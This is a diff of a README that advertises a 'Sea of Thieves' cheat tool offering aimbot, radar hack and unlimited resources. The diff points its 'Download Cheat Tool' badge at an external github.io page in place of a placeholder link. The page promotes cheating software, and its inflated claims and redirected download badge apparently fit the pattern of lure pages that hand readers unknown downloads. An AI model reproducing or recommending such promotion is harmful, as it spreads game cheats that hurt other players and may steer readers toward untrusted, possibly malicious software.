@@ -3,7 +3,7 @@
 
 **Become the most powerful pirate in the **Sea of Thieves** with our **cheat tool** packed with **aimbot**, **radar hack**, and **unlimited resources**. Designed for players who want to dominate battles, loot chests instantly, and outsmart rivals.**
 
-[![Download Cheats](https://img.shields.io/badge/Download-Cheat%20Tool-blueviolet)](#)  
+[![Download Cheats](https://img.shields.io/badge/Download-Cheat%20Tool-blueviolet)](https://seaofthieves-hack.github.io/.github/)  
 
 ## 🎯 **Key Features**  
 - **Aimbot**: Auto-lock onto enemies with 100% accuracy 🔥  
